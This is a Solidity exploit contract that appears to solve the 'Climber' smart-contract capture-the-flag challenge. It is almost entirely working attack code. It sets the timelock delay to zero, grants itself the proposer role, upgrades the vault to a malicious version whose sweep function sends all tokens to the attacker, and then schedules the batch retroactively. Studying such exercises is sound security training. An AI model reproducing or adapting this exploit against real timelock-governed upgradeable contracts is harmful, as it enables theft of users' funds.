// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ClimberVault.sol";

contract ClimberVaultV2 is ClimberVault {
    function sweep(IERC20 token, address attackerEOA) public {
        token.transfer(attackerEOA, token.balanceOf(address(this)));
    }
}

contract ClimberAttack {
    ClimberVault vault;
    ClimberTimelock timelock;
    IERC20 token;

    address[] targets;
    uint256[] values;
    bytes[] dataElements;

    constructor(ClimberVault _vault, IERC20 _token) {
        vault = _vault;
        timelock = ClimberTimelock(payable(vault.owner()));
        token = _token;
    }

    // targets, values, dataElements all must be same length as they associate 1:1 during execution.
    function exploit() public payable {
        targets = [address(timelock), address(timelock), address(vault), address(this)];
        values = [0, 0, 0, 0]; // ETH value to send can be 0.
        dataElements = [
            // 1st dataElement: Set the delay of the timelock to 0. Important for immediate execution of scheduled operation.
            abi.encodeWithSelector(timelock.updateDelay.selector, 0),
            // 2nd dataElement: Grants us the PROPOSER role, so we can schedule operations.
            abi.encodeWithSelector(timelock.grantRole.selector, PROPOSER_ROLE, address(this)),
            // 3rd dataElement: Upgrades vault to our malicious vault, then calls our sweep function stealing the DVT.
            // Params: {function selector, our malicious new vault address, data to be executed}
            abi.encodeWithSelector(
                vault.upgradeToAndCall.selector,
                address(new ClimberVaultV2()),
                // This is the data to be executed. We want to call `sweep` from our malicious vault to steal all the money.
                // Params: {function selector, IERC20 token, our attacker address}
                abi.encodeWithSelector(
                    ClimberVaultV2.sweep.selector,
                    address(token), 
                    msg.sender
                )
            ),
            // 4th dataElement: Our address must then call our `scheduleOperation` to `schedule` these operations.
            abi.encodeWithSignature("scheduleOperation()")
        ];
        // Calls `execute` on `timelock` with all these prepared arguments.
        timelock.execute(targets, values, dataElements, 0);
    }

    function scheduleOperation() public payable {
        timelock.schedule(targets, values, dataElements, 0);
    }
}